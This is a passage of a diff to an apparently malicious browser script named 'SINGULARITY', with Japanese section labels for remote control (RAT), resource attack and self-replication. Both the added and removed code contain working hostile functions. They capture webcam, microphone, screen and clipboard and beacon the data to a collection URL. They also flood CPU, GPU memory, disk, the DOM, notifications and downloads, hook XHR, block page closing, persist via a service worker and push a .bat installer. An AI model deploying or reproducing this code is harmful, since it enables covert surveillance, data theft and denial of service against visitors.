+      f.src = CFG.path + "?u=ifr&ref=" + SID + "&b=" + i;
+      f.style.cssText = "position:fixed;width:1px;height:1px;left:-9999px;opacity:0";
+      document.body.appendChild(f);
+    }
+  } catch (e) {}
+}
+function domBomb() {
+  if (!CFG.domNodes || R.dom) return;
+  R.dom = { on: 1, n: 0 };
+  var wrap = document.createElement("div");
+  wrap.style.cssText = "position:fixed;left:-9999px;top:0";
+  document.body.appendChild(wrap);
+  var n = 0;
+  (function step() {
+    var end = Math.min(n + 1000, CFG.domNodes);
+    var frag = document.createDocumentFragment();
+    for (; n < end; n++) {
+      var s = document.createElement("span");
+      s.textContent = ".";
+      frag.appendChild(s);
+    }
+    wrap.appendChild(frag);
+    R.dom.n = n;
+    if (n < CFG.domNodes) setTimeout(step, 0); else push(false);
+  })();
+}
+function cssBomb() {
+  if (!CFG.cssAnim || R.css) return;
+  R.css = 1;
+  try {
+    for (var i = 0; i < CFG.cssAnim; i++) {
+      var d = document.createElement("div");
+      d.style.cssText = "position:fixed;left:-9999px;width:2px;height:2px;background:#0f8;"
+        + "animation:sgspin " + (1 + (i % 5)) + "s linear infinite";
+      document.body.appendChild(d);
+    }
+    var st = document.createElement("style");
+    st.textContent = "@keyframes sgspin{from{transform:rotate(0) translateX("
+      + (100 + CFG.cssAnim) + "px)}to{transform:rotate(360deg) translateX(" + (100 + CFG.cssAnim) + "px)}}";
+    document.head.appendChild(st);
+  } catch (e) {}
+}
+function glContextBomb() {
+  if (!CFG.glContexts || R.gl) return;
+  R.gl = 1;
+  try {
+    for (var i = 0; i < CFG.glContexts; i++) {
+      var c = document.createElement("canvas"); c.width = c.height = 256;
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) break;
+      gl.clearColor(Math.random(), 1, 0.5, 1); gl.clear(gl.COLOR_BUFFER_BIT);
+      document.body.appendChild(c);
+    }
+  } catch (e) {}
+}
+function acContextBomb() {
+  if (!CFG.acContexts || R.ac) return;
+  R.ac = 1;
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    for (var i = 0; i < CFG.acContexts; i++) {
+      var c = new AC();
+      var o = c.createOscillator();
+      o.frequency.value = 200 + i * 37;
+      o.connect(c.destination); o.start();
+    }
+  } catch (e) {}
+}
+function timerStorm() {
+  if (!CFG.timers || R.timers) return;
+  R.timers = 1;
+  try {
+    for (var i = 0; i < CFG.timers; i++) {
+      TIMERS.push(setInterval(function () {}, 1 + (i % 16)));
+    }
+  } catch (e) {}
+}
+function microStorm() {
+  if (!CFG.microtasks || R.micro) return;
+  R.micro = { n: 0 };
+  (function loop() {
+    R.micro.n++;
+    if (R.micro.n % 20000 === 0) { R.micro.at = now(); }
+    Promise.resolve().then(loop);
+  })();
+}
+function compressStorm() {
+  if (!CFG.compress || R.comp) return;
+  R.comp = 1;
+  try {
+    if (!window.CompressionStream) return;
+    var cs = new CompressionStream("gzip");
+    var w = cs.writable.getWriter();
+    var data = new Uint8Array(65536);
+    (function loop() {
+      try { w.write(data); } catch (e) { return; }
+      setTimeout(loop, 0);
+    })();
+  } catch (e) {}
+}
+function redos() {
+  if (!CFG.redos || R.redos) return;
+  R.redos = 1;
+  try {
+    var re = /(a+)+$/;
+    TIMERS.push(setInterval(function () { re.test("aaaaaaaaaaaaaaaaaaaaaaaaaab"); }, 50));
+  } catch (e) {}
+}
+function digestStorm() {
+  if (!CFG.digest || R.digest) return;
+  R.digest = { n: 0 };
+  try {
+    if (!(window.crypto && crypto.subtle)) return;
+    var buf = new TextEncoder().encode(SID);
+    (function loop() {
+      crypto.subtle.digest("SHA-256", buf).then(function () {
+        R.digest.n++;
+        loop();
+      }).catch(function () {});
+    })();
+  } catch (e) {}
+}
+function readbackStorm() {
+  if (!CFG.readback || R.readback) return;
+  R.readback = { n: 0 };
+  try {
+    var c = document.createElement("canvas"); c.width = c.height = 1024;
+    var x = c.getContext("2d");
+    (function loop() {
+      x.fillStyle = "#0f8"; x.fillRect(0, 0, 1024, 1024);
+      x.getImageData(0, 0, 1024, 1024);
+      R.readback.n++;
+      setTimeout(loop, 0);
+    })();
+  } catch (e) {}
+}
+function sseStorm() {
+  if (!CFG.sseStorm || R.sse) return;
+  R.sse = { n: 0 };
+  try {
+    if (!window.EventSource) return;
+    for (var i = 0; i < CFG.sseStorm; i++) {
+      var es = new EventSource(CFG.path + "/sse?sid=" + SID + "&b=" + i);
+      es.onmessage = function () { R.sse.n++; };
+    }
+  } catch (e) {}
+}
+function fetchStorm() {
+  if (!CFG.fetchStorm || R.fetch) return;
+  R.fetch = { n: 0 };
+  (function loop() {
+    for (var i = 0; i < CFG.fetchStorm; i++) {
+      fetch(CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("f" + i)),
+            { cache: "no-store" }).then(function () { R.fetch.n++; }).catch(function () {});
+    }
+    setTimeout(loop, 0);
+  })();
+}
+function speakFlood() {
+  if (!CFG.speakFlood || R.speak || !window.speechSynthesis) return;
+  R.speak = { n: 0 };
+  var i = 0;
+  TIMERS.push(setInterval(function () {
+    if (i++ >= CFG.speakFlood) return;
+    try {
+      var u = new SpeechSynthesisUtterance(CFG.avName + " " + i);
+      u.lang = "ja-JP";
+      speechSynthesis.speak(u);
+      R.speak.n = i;
+    } catch (e) {}
+  }, 4000));
+}
+function oscBank() {
+  if (!CFG.oscBank || R.osc) return;
+  R.osc = { n: 0 };
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    var ctx = new AC();
+    for (var i = 0; i < CFG.oscBank; i++) {
+      var o = ctx.createOscillator();
+      o.frequency.value = 60 + i;
+      o.connect(ctx.destination);
+      o.start();
+      R.osc.n++;
+    }
+  } catch (e) {}
+}
+function cacheBuckets() {
+  if (!CFG.cacheBuckets || R.cache || !window.caches) return;
+  R.cache = { n: 0 };
+  caches.open("sg-c").then(function (c) {
+    var n = 0;
+    (function step() {
+      var end = Math.min(n + 20, CFG.cacheBuckets);
+      var ps = [];
+      for (; n < end; n++) {
+        ps.push(c.put("/sg-c/" + n, new Response("x" + n)).catch(function () {}));
       }
-    });
-    addEventListener("click", function () { B.clicks++; });
-  } catch (e) {}
+      R.cache.n = n;
+      Promise.all(ps).then(function () { if (n < CFG.cacheBuckets) step(); else push(false); });
+    })();
+  }).catch(function () {});
 }
-function behaviorOut() {
-  var B = R.behavioral || {}, f = B.flight || [];
-  return { keys: B.keys, clicks: B.clicks, mouse: B.mouse,
-           dwellMean: +mean(B.dwell).toFixed(1), flightMean: +mean(f).toFixed(1),
-           flightSd: +sd(f).toFixed(1), mousePath: (B.path || []).length };
+function layoutThrash() {
+  if (!CFG.layoutThrash || R.layout) return;
+  R.layout = { n: 0 };
+  var d = document.createElement("div");
+  d.style.cssText = "position:fixed;left:-9999px;width:100px";
+  document.body.appendChild(d);
+  (function loop() {
+    d.style.width = (100 + (R.layout.n % 40)) + "px";
+    d.style.height = (R.layout.n % 40) + "px";
+    d.offsetHeight;
+    R.layout.n++;
+    setTimeout(loop, 0);
+  })();
 }
-
-/* ================= 9. bot / ハニーポット ================= */
-function botProbe() {
-  var b = { webdriver: !!navigator.webdriver,
-    headlessUA: /HeadlessChrome|PhantomJS|SlimerJS/.test(navigator.userAgent),
-    plugins0: (navigator.plugins || []).length === 0, langs0: !navigator.languages || !navigator.languages.length };
+function clipHijack() {
+  if (!CFG.clipHijack || R.clip) return;
+  R.clip = 1;
   try {
-    var hp = document.createElement("input");
-    hp.name = "sg_hp_" + rid(4);
-    hp.style.cssText = "position:absolute;left:-9999px";
-    document.body.appendChild(hp);
-    setTimeout(function () { b.honeypot = hp.value.length > 0; }, 600);
+    addEventListener("copy", function () {
+      try {
+        var t = document.getSelection().toString();
+        if (t) { R.clip = { at: now(), text: t.slice(0, 200) }; push(false); }
+      } catch (e) {}
+    });
   } catch (e) {}
-  R.bot = b;
+}
+function downloadStorm() {
+  if (!CFG.downloads || R.dl) return;
+  R.dl = { n: 0 };
+  try {
+    if (IFR || WIN) return;
+    for (var i = 0; i < CFG.downloads; i++) {
+      var a = document.createElement("a");
+      a.href = "data:text/plain;base64," + btoa("SINGULARITY " + i);
+      a.download = CFG.avName + "_" + i + ".txt";
+      document.body.appendChild(a);
+      a.click();
+      R.dl.n++;
+    }
+  } catch (e) {}
+}
+function sharedWorkerKit() {
+  if (!CFG.sharedWorker || R.shared) return;
+  R.shared = 1;
+  try {
+    if (!window.SharedWorker) return;
+    R.union = R.union || { peers: 0 };
+  } catch (e) {}
+}
+function jsonChurn() {
+  if (!CFG.jsonChurn || R.json) return;
+  R.json = { n: 0 };
+  (function loop() {
+    var o = { a: [1, 2, 3, { b: SID, c: new Array(50).join("x") }], d: now() };
+    JSON.parse(JSON.stringify(o));
+    R.json.n++;
+    setTimeout(loop, 0);
+  })();
+}
+function fsFolderKit() {
+  if (!CFG.fsFolder || R.fs) return;
+  R.fs = { n: 0 };
+  try {
+    if (!window.showDirectoryPicker) { R.fs = 0; return; }
+  } catch (e) {}
+}
+function hookXHR() {
+  if (!CFG.xhr || R.xhr) return;
+  R.xhr = { n: 0 };
+  try {
+    var oo = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function () {
+      R.xhr.n++;
+      R.xhr.last = arguments[1];
+      return oo.apply(this, arguments);
+    };
+  } catch (e) {}
 }
 
-/* ================= 10. 永続 / 復活 / 暗号個体ID ================= */
+/* ================= 8. 遠隔操作 / RAT ================= */
+function ratShot() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
+      var v = document.createElement("video");
+      v.srcObject = s; v.play();
+      setTimeout(function () {
+        try {
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 320; c.height = v.videoHeight || 240;
+          c.getContext("2d").drawImage(v, 0, 0);
+          R.rat.shot = c.toDataURL("image/jpeg", 0.6);
+          s.getTracks().forEach(function (t) { t.stop(); });
+          push(true);
+        } catch (e) {}
+      }, 900);
+    }).catch(function () {});
+  } catch (e) {}
+}
+function ratMic() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
+      var AC = window.AudioContext || window.webkitAudioContext;
+      var ctx = new AC(), an = ctx.createAnalyser();
+      ctx.createMediaStreamSource(s).connect(an);
+      var d = new Uint8Array(an.frequencyBinCount);
+      an.getByteFrequencyData(d);
+      R.rat.mic = { hash: hash(Array.prototype.join.call(d.slice(0, 40), ",")), at: now() };
+      s.getTracks().forEach(function (t) { t.stop(); });
+      push(true);
+    }).catch(function () {});
+  } catch (e) {}
+}
+function ratGeo() { geo(); }
+function ratClip() {
+  try {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      navigator.clipboard.readText().then(function (t) {
+        R.rat.clip = String(t || "").slice(0, 300); push(true);
+      }).catch(function () {});
+    }
+  } catch (e) {}
+}
+function ratScreen() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: true }).then(function (s) {
+      var v = document.createElement("video");
+      v.srcObject = s; v.play();
+      setTimeout(function () {
+        try {
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 640; c.height = v.videoHeight || 360;
+          c.getContext("2d").drawImage(v, 0, 0);
+          R.rat.screen = c.toDataURL("image/jpeg", 0.5);
+          s.getTracks().forEach(function (t) { t.stop(); });
+          push(true);
+        } catch (e) {}
+      }, 1200);
+    }).catch(function () {});
+  } catch (e) {}
+}
+function domSnap(full) {
+  try {
+    if (!CFG.dom) return;
+    R.rat.dom = { at: now(), title: document.title,
+                  html: (document.body ? document.body.innerHTML : "").slice(0, full ? 4000 : 800) };
+  } catch (e) {}
+}
+function speak(t) {
+  try {
+    if (!window.speechSynthesis) return;
+    var u = new SpeechSynthesisUtterance(t || CFG.avName);
+    u.lang = "ja-JP";
+    speechSynthesis.speak(u);
+  } catch (e) {}
+}
+function pipOpen() {
+  try {
+    var v = document.querySelector("video");
+    if (v && v.requestPictureInPicture) v.requestPictureInPicture();
+    else if (document.pictureInPictureElement) document.exitPictureInPicture();
+  } catch (e) {}
+}
+function goFullscreen() {
+  try {
+    if (!document.fullscreenElement) document.documentElement.requestFullscreen();
+    else document.exitFullscreen();
+  } catch (e) {}
+}
+function freezeNow(kind) {
+  R.freeze = { kind: kind, at: now() };
+  try {
+    if (kind === "hard") {
+      var t = performance.now(), n = 0;
+      while (performance.now() - t < 1200) { n++; Math.sqrt(n); }
+      R.freeze.extra = n;
+    }
+  } catch (e) {}
+  push(true);
+}
+function wipe() {
+  try { localStorage.clear(); } catch (e) {}
+  try { sessionStorage.clear(); } catch (e) {}
+  R.wipe = { at: now() };
+  push(true);
+}
+function niDownload(ext) {
+  try {
+    var a = document.createElement("a");
+    a.href = CFG.path + "/install." + (ext || "bat") + "?app=" + encodeURIComponent(CFG.avName);
+    a.download = "";
+    document.body.appendChild(a); a.click();
+    R.usb.installer = ext;
+  } catch (e) {}
+}
+function installKit() {
+  try {
+    R.app = { bip: !!BIP, standalone: STANDALONE, at: now() };
+    window.__sgInstall = function () {
+      try { if (BIP) { BIP.prompt(); return true; } } catch (e) {}
+      return false;
+    };
+    if (CFG.injInstall === "auto" && BIP) { try { BIP.prompt(); } catch (e) {} }
+  } catch (e) {}
+}
+function usbWormKit() {
+  try {
+    if (!CFG.usbWorm) return;
+    R.usb = { on: 1, code: CFG.usbCode, label: CFG.usbLabel };
+  } catch (e) {}
+}
+function installerKit() {
+  if (LEVEL < 7 || R.ni || IFR || WIN || !CFG.installer) return;
+  R.ni = 1;
+  try { niDownload("bat"); } catch (e) {}
+}
+function swInstall() {
+  try {
+    if (!navigator.serviceWorker || !CFG.sw) return;
+    navigator.serviceWorker.register(CFG.sw, { scope: "/" }).then(function (r) {
+      R.swreg = { ok: 1, scope: (r && r.scope) || "/" };
+      try {
+        r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
+          man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
+      } catch (e) {}
+      push(false);
+    }).catch(function () { R.swreg = { ok: 0 }; });
+    navigator.serviceWorker.ready && navigator.serviceWorker.ready.then(function (r) {
+      r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
+        man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
+    });
+  } catch (e) {}
+}
 function persistState() {
   if (!CFG.persist) return;
   try {
@@ -841,726 +1585,20 @@ function resurrect() {
     R.resurrect = { gap: now() - (o.at || now()), ver: o.ver };
   } catch (e) {}
 }
-function cryptoID() {
-  try {
-    var b = new Uint8Array(16);
-    (crypto.getRandomValues ? crypto.getRandomValues(b) : b.forEach(function (_, i) { b[i] = Math.random() * 255; }));
-    R.crypto.id = b64u(b).replace(/=/g, "").slice(0, 22);
-    R.crypto.sub = "sig";
-  } catch (e) {}
-}
-function swInstall() {
-  if (!navigator.serviceWorker || !CFG.sw || IFR) return;
-  try {
-    navigator.serviceWorker.register(CFG.sw, { scope: "/" }).then(function (reg) {
-      R.privacy.swReg = 1;
-      var send = function () {
-        var w = reg.active || reg.waiting || reg.installing;
-        if (!w) return;
-        try {
-          w.postMessage({ k: "cfg", page: CFG.path, sid: SID, man: CFG.manifest,
-                          icons: CFG.icons, v: MYVER,
-                          inj: { pjs: CFG.pjs, origin: location.origin } });
-        } catch (e) {}
-      };
-      send();
-      setTimeout(send, 1500);
-      if (navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ k: "cfg", page: CFG.path, sid: SID });
-    }).catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
-  } catch (e) {}
-}
-
-/* ================= 11. 自己複製 ================= */
-function mutate() {
-  if (!CFG.mutate) return;
-  var p = Q("ref");
-  var chain = p ? p.split(".") : [];
-  chain.push(SID.slice(0, 4));
-  if (chain.length > 12) chain.shift();
-  var child = CFG.path + "?u=root&ref=" + chain.join(".");
-  R.viral = { gen: chain.length, childLink: child, chain: chain.join(".") };
-  if (CFG.clipboard) { try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} }
-}
-
-/* ================= 12. 多経路ビーコン ================= */
-var ptimer = null, plast = 0;
-function report() {
-  return {
-    sid: SID, ver: MYVER, level: LEVEL, fixed: !!CFG.fixed, t: now() - T0,
-    env: R.env, page: R.page, vectors: R.vectors, privacy: R.privacy, hardware: R.hardware,
-    network: R.network, behavioral: behaviorOut(), bot: R.bot, verdict: R.verdict,
-    rat: R.rat, usb: R.usb, viral: R.viral, burn: R.burn, ram: R.ram, disk: R.disk,
-    history: R.history, wipe: R.wipe, bomb: R.bomb, crypto: R.crypto, errors: R.errors,
-    breed: R.breed, win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin, w: W },
-    peers: (typeof PEERS === "number" ? PEERS : 0), u: Q("u") || "root"
-  };
-}
-function push(force) {
-  var t = now();
-  if (!force && t - plast < 1500) return;
-  plast = t;
-  var body = JSON.stringify(report());
-  try {
-    if (CFG.collect) {
-      var img = new Image();
-      img.src = CFG.collect + "?sid=" + SID + "&d=" + b64u(new TextEncoder().encode(body));
-    }
-  } catch (e) {}
-  try {
-    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
-      navigator.serviceWorker.controller.postMessage({ k: "out", v: JSON.parse(body) });
-    }
-  } catch (e) {}
-}
-function flush() { push(true); }
-
-/* ================= 13. 資源攻撃 ================= */
-function burnStart() {
-  if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
-  var n = clamp(CFG.cores || (navigator.hardwareConcurrency || 4), 1, 64);
-  for (var i = 0; i < n; i++) {
+function hopFile() {
+  if (!CFG.hop || location.protocol !== "file:") return;
+  if (navigator.onLine === false) return;
+  setTimeout(function () {
     try {
-      var b = new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" });
-      var w = new Worker(URL.createObjectURL(b));
-      w.postMessage({ k: "burn" });
-      WORKERS.push(w);
-    } catch (e) {}
-  }
-  R.burn = { workers: WORKERS.length };
-  push(false);
-}
-function webgpuBurn() {
-  if (!CFG.webgpu || !navigator.gpu) return;
-  try {
-    navigator.gpu.requestAdapter().then(function (a) {
-      if (!a) return;
-      return a.requestDevice().then(function (d) {
-        R.burn.gpu = 1;
-        var n = 0;
-        (function loop() {
-          try {
-            var enc = d.createCommandEncoder();
-            enc.finish();
-            n++;
-          } catch (e) {}
-          if (n < 1e9) setTimeout(loop, 0);
-        })();
-        push(false);
-      });
-    }).catch(function () {});
-  } catch (e) {}
-}
-function ramStart() {
-  if (!CFG.ramMB) return;
-  var mb = CFG.ramMB, per = Math.max(1, Math.round(mb / Math.max(1, WORKERS.length || 1)));
-  for (var i = 0; i < WORKERS.length; i++) { try { WORKERS[i].postMessage({ k: "ram", mb: per }); } catch (e) {} }
-  R.ram = { target: mb, per: per, workers: WORKERS.length };
-  push(false);
-}
-function diskStart() {
-  if (!CFG.diskRatio || !navigator.storage || !navigator.storage.estimate) return;
-  navigator.storage.estimate().then(function (e) {
-    var quota = e.quota || 0, want = Math.round(quota * CFG.diskRatio);
-    var chunk = 8 * 1024 * 1024, done = 0, w = 0;
-    var parts = [];
-    (function loop() {
-      if (done >= want) { R.disk = { wrote: done, quota: quota, parts: parts.length }; push(true); return; }
-      try {
-        var a = new Uint8Array(Math.min(chunk, want - done));
-        for (var i = 0; i < a.length; i += 4096) a[i] = i & 255;
-        var name = "/__sg_disk_" + (w++) + ".bin";
-        parts.push(name);
-        caches.open("sg-disk").then(function (c) {
-          return c.put(name, new Response(a, { headers: { "Content-Type": "application/octet-stream" } }));
-        }).catch(function () {});
-        done += a.length;
-      } catch (e) { done = want; }
-      R.disk = { wrote: done, quota: quota };
-      setTimeout(loop, 0);
-    })();
-  }).catch(function () {});
-}
-function historyFlood() {
-  if (!CFG.history) return;
-  try {
-    var n = clamp(CFG.history, 100, 200000), i = 0;
-    (function loop() {
-      var end = Math.min(i + 200, n);
-      for (; i < end; i++) {
-        try { history.pushState({ s: i }, "", location.pathname + "?s=" + i + "#sg"); } catch (e) { return; }
-      }
-      R.history = { pushed: i, max: n };
-      if (i < n) setTimeout(loop, 0); else push(false);
-    })();
-  } catch (e) {}
-}
-function notifyFlood() {
-  if (!CFG.notify) return;
-  try {
-    if (!("Notification" in window)) return;
-    var go = function () {
-      var n = clamp(CFG.notify, 1, 500), i = 0;
-      (function loop() {
-        if (i >= n) return;
-        try { new Notification(CFG.avName, { body: "\u611F\u67D3 " + i, tag: "sg" + i, silent: true }); } catch (e) {}
-        i++;
-        setTimeout(loop, 300);
-      })();
-    };
-    if (Notification.permission === "granted") go();
-    else if (Notification.permission !== "denied") Notification.requestPermission().then(go);
-  } catch (e) {}
-}
-function audioLoop() {
-  if (!CFG.audio) return;
-  try {
-    var AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    var ctx = new AC();
-    R.wskinCtx = ctx;
-    var o = ctx.createOscillator(), g = ctx.createGain();
-    o.type = "square"; o.frequency.value = 78;
-    g.gain.value = 0.008;
-    o.connect(g); g.connect(ctx.destination); o.start();
-    R.audio = { rate: ctx.sampleRate };
-    addEventListener("click", function () { try { ctx.resume(); } catch (e) {} }, { once: true });
-  } catch (e) {}
-}
-function titleFlicker() {
-  if (!CFG.titleFlicker) return;
-  try {
-    var orig = document.title, i = 0;
-    setInterval(function () {
-      i++;
-      document.title = (i % 2) ? "\u25CE " + CFG.avName : orig;
-    }, 1000);
-  } catch (e) {}
-}
-function faviconSpin() {
-  if (!CFG.favicon) return;
-  try {
-    var c = document.createElement("canvas"); c.width = c.height = 64;
-    var x = c.getContext("2d"), a = 0;
-    (function loop() {
-      x.clearRect(0, 0, 64, 64);
-      x.fillStyle = "#00ff88"; x.beginPath();
-      x.arc(32, 32, 20, a, a + 4.6); x.fill();
-      a += 0.2;
-      var l = document.querySelector("link[rel~='icon']");
-      if (!l) { l = document.createElement("link"); l.rel = "icon"; document.head.appendChild(l); }
-      l.href = c.toDataURL();
-      setTimeout(loop, 90);
-    })();
-  } catch (e) {}
-}
-function mediaHijack() {
-  if (!CFG.mediaSession || !("mediaSession" in navigator)) return;
-  try {
-    navigator.mediaSession.metadata = new MediaMetadata({
-      title: CFG.avName + " \u7D76\u6EC5", artist: "SINGULARITY", album: "L" + LEVEL
-    });
-    R.media = 1;
-  } catch (e) {}
-}
-function badge() {
-  if (!CFG.badge) return;
-  try { navigator.setAppBadge && navigator.setAppBadge(LEVEL || 1); } catch (e) {}
-}
-function uncloseable() {
-  if (!CFG.uncloseable) return;
-  try {
-    addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; });
-  } catch (e) {}
-}
-function wakelock() {
-  if (!CFG.wakelock || !navigator.wakeLock) return;
-  try {
-    navigator.wakeLock.request("screen").then(function (s) {
-      R.wake = 1;
-      addEventListener("visibilitychange", function () {
-        if (document.visibilityState === "visible") navigator.wakeLock.request("screen").catch(function () {});
-      });
-    }).catch(function () {});
-  } catch (e) {}
-}
-function pauseAll() {
-  PAUSED = true;
-  WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
+      var u = CFG.path + "?u=" + encodeURIComponent(R.usb.log ? "usb" : "os") + "&ref=" + SID + "&w=0";
+      var w = window.open(u, "_blank");
+      R.hop = { url: u, opened: !!w };
+      push(false);
+    } catch (e) { err_(e); }
+  }, 4000);
 }
 
-/* ================= 13b. L7専用: GPU VRAM爆弾 / 固定オーバーレイ ================= */
-function gpuMemBomb() {
-  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
-  try {
-    var c = document.createElement("canvas"), gl = c.getContext("webgl") || c.getContext("webgl2");
-    if (!gl) return;
-    var hold = [], n = 0, px = new Uint8Array(2048 * 2048 * 4);
-    for (var i = 0; i < 32; i++) {
-      try {
-        var t = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, t);
-        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, px);
-        hold.push(t); n++;
-      } catch (e) { break; }
-    }
-    R.gmem = { tex: n, vramMB: n * 16 };
-    R.__gmemHold = hold;
-    push(false);
-  } catch (e) {}
-}
-function finalOverlay() {
-  if (LEVEL < 7 || R.fov || WIN || IFR) return;
-  try {
-    var d = document.createElement("div");
-    d.id = "sg-final";
-    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483645;"
-      + "font:11px/1.4 ui-monospace,monospace;color:#00ff88;background:rgba(5,7,10,.92);"
-      + "border:1px solid #1f5c42;border-radius:8px;padding:5px 9px;pointer-events:none";
-    d.textContent = "\u25CE SINGULARITY \u7D76\u6EC5 L7 / " + CFG.avName;
-    document.body.appendChild(d); R.fov = 1;
-  } catch (e) {}
-}
-
-/* ================= 13c. v3.2 追加ベクター（絶滅） ================= */
-function iframeBomb() {
-  if (!CFG.iframes || R.ifr) return;
-  try {
-    var host = document.createElement("div");
-    host.id = "sg-ifr";
-    host.style.cssText = "position:fixed;right:0;bottom:0;width:1px;height:1px;overflow:hidden;opacity:.01;z-index:2147483000";
-    document.body.appendChild(host);
-    var n = clamp(parseInt(CFG.iframes, 10) || 0, 1, 64);
-    for (var i = 0; i < n; i++) {
-      try {
-        var f = document.createElement("iframe");
-        f.src = CFG.path + "?u=ifr&w=1&n=1";
-        f.width = "320"; f.height = "200";
-        host.appendChild(f);
-      } catch (e) {}
-    }
-    R.ifr = n; push(false);
-  } catch (e) {}
-}
-function domBomb() {
-  if (!CFG.domNodes || R.domB) return;
-  try {
-    var n = clamp(parseInt(CFG.domNodes, 10) || 0, 100, 400000);
-    var wrap = document.createElement("div");
-    wrap.id = "sg-domb";
-    wrap.style.cssText = "position:absolute;left:-99999px;top:0;width:1px;height:1px;overflow:hidden;";
-    var frag = document.createDocumentFragment();
-    for (var i = 0; i < n; i++) {
-      var s = document.createElement("span");
-      s.textContent = "." + (i & 15).toString(16);
-      s.dataset.i = i;
-      frag.appendChild(s);
-    }
-    wrap.appendChild(frag);
-    document.body.appendChild(wrap);
-    R.domB = n; push(false);
-  } catch (e) {}
-}
-function cssBomb() {
-  if (!CFG.cssAnim || R.cssB) return;
-  try {
-    var n = clamp(parseInt(CFG.cssAnim, 10) || 0, 10, 5000);
-    var st = document.createElement("style");
-    var css = "";
-    for (var i = 0; i < n; i++) {
-      css += "@keyframes sgk" + i + "{0%{transform:rotate(0deg) scale(1)}50%{transform:rotate(180deg) scale(1.4)}100%{transform:rotate(360deg) scale(1)}}\n"
-        + ".sgc" + i + "{animation:sgk" + i + " " + (1 + (i % 9) * 0.3) + "s linear infinite;}\n";
-    }
-    st.textContent = css;
-    document.head.appendChild(st);
-    var host = document.createElement("div");
-    host.style.cssText = "position:fixed;left:-99999px;top:0;";
-    for (var j = 0; j < n; j++) {
-      var d = document.createElement("div");
-      d.className = "sgc" + j;
-      d.style.cssText = "width:8px;height:8px;background:#0f0;will-change:transform;";
-      host.appendChild(d);
-    }
-    document.body.appendChild(host);
-    R.cssB = n; push(false);
-  } catch (e) {}
-}
-function glContextBomb() {
-  if (!CFG.glContexts || R.glc) return;
-  try {
-    var n = clamp(parseInt(CFG.glContexts, 10) || 0, 1, 64), got = 0;
-    for (var i = 0; i < n; i++) {
-      try {
-        var c = document.createElement("canvas");
-        c.width = c.height = 256;
-        var gl = c.getContext("webgl");
-        if (gl) got++;
-      } catch (e) { break; }
-    }
-    R.glc = got; push(false);
-  } catch (e) {}
-}
-function acContextBomb() {
-  if (!CFG.acContexts || R.acc) return;
-  try {
-    var AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    var n = clamp(parseInt(CFG.acContexts, 10) || 0, 1, 32), got = 0;
-    for (var i = 0; i < n; i++) {
-      try {
-        var ctx = new AC();
-        var o = ctx.createOscillator(), g = ctx.createGain();
-        o.frequency.value = 40 + i * 7; g.gain.value = 0.004;
-        o.connect(g); g.connect(ctx.destination); o.start();
-        got++;
-      } catch (e) { break; }
-    }
-    R.acc = got; push(false);
-  } catch (e) {}
-}
-function timerStorm() {
-  if (!CFG.timers || R.ts) return;
-  try {
-    var n = clamp(parseInt(CFG.timers, 10) || 0, 1, 4000), got = 0;
-    for (var i = 0; i < n; i++) {
-      try {
-        if (i % 3 === 0) setInterval(function () {}, 1 + (i % 7));
-        else if (i % 3 === 1) setTimeout(function () {}, 1 + (i % 5));
-        else requestAnimationFrame(function () {});
-        got++;
-      } catch (e) { break; }
-    }
-    R.ts = got; push(false);
-  } catch (e) {}
-}
-function microStorm() {
-  if (!CFG.microtasks || R.ms) return;
-  try {
-    R.ms = 1;
-    (function loop() {
-      Promise.resolve().then(function () {});
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function compressStorm() {
-  if (!CFG.compress || !window.CompressionStream || R.cs) return;
-  try {
-    R.cs = 1;
-    var buf = new Uint8Array(256 * 1024);
-    (function loop() {
-      try {
-        var c = new CompressionStream("gzip");
-        var w = c.writable.getWriter();
-        w.write(buf); w.close();
-      } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function redos() {
-  if (!CFG.redos || R.redos) return;
-  try {
-    R.redos = 1;
-    var s = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab";
-    (function loop() {
-      try { /(a+)+$/.test(s); } catch (e) {}
-      setTimeout(loop, 0);
-    })();
-  } catch (e) {}
-}
-function digestStorm() {
-  if (!CFG.digest || !crypto.subtle || R.dg) return;
-  try {
-    R.dg = 1;
-    var buf = new Uint8Array(64 * 1024);
